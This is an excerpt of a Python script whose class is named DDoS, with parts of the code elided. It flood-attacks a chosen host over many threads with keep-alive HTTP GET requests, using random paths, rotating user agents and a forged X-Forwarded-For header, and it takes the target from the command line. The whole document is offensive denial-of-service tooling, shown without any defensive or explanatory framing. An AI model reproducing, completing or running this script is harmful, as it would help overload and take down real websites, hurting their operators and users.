...
class DDoS:
    #Init
    def __init__(self, host, ip, port, threads):
        #Self vars
        self.host = host
        self.ip = ip
        self.port = port
        ...
        self.requestCount = 0
        self.timeSec = 0
        self.path = list('QWERTYUIOPASDFGHJKLXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890')
        self.userAgent = [
        ...
        while self.threadEvent.isSet():
            try:
                ...
                self.timeSec += 1/10
                print(f'+Request #{self.requestCount} / {round(self.timeSec, 1)} Secs / {self.sentSec} Requests/s ~ {self.ip}@{self.port} -> {self.host}')
            #Ctrl+C
                    ...
                    try:
                        ...
                        while self.threadEvent.isSet():
                            try:
                                ...
                                sock.send(f'GET /{"".join(choice(self.path) for y in range(randint(5, 15)))} HTTP/1.1\r\nHost: {self.host}\r\nUser-Agent: {choice(self.userAgent)}\r\nConnection: keep-alive\r\nX-Forwarded-For: {fakeIp}\r\nX-Forwarded-Host: {self.host}\r\n\r\n'.encode('utf-8'))
                                self.requestCount += 1
                                msg = ''
                                while self.threadEvent.isSet():
                                    data = sock.recv(1024)
...
if __name__ == '__main__':
    argParse()
    DDoS(args.host, args.ip, args.port, args.threads)
